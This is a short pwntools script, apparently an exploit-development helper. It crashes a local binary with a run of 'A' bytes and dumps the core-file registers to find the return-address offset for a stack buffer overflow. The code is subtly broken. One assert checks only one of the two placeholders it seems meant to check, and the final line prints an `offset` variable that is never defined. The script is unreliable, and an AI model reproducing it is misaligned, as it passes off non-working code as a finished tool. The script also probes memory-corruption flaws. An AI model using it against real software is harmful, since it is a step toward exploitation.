#!/usr/bin/env python3
from pwn import *
from prettytable import PrettyTable


def get_corefile_location(executable_name: str, pid: int) -> os.PathLike[str]:
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        assert "%e" and "%p" in core_pattern
        return core_pattern.replace("%e", executable_name).replace("%p", str(pid)).strip()

payload = b'A'*77
# Start the vulnerable binary
with process(['./example', payload]) as p:
    p.wait()  # Wait for the program to crash

# Examine the crash to find the offset
core = Coredump(get_corefile_location("example", p.pid))

table = PrettyTable()
table.field_names = ["register", "value"]
sorted_registers = dict(sorted(core.registers.items(), key=lambda item: -item[1]))
for k,v in sorted_registers.items():
    table.add_row([k,v])

print(table)

print(f"Offset to overwrite return address: {offset}")

